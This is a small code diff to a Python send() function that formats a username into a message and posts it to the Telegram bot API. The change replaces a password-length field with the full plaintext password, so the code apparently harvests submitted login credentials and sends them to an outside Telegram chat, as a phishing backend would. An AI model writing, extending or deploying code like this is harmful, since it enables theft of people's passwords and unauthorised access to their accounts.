@@ -28,7 +28,7 @@ def send():
 New message
 
 Username: {data.get('username')}
-Password length: {data.get('passwordLength')}
+Password: {data.get('password')}
 """
 
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
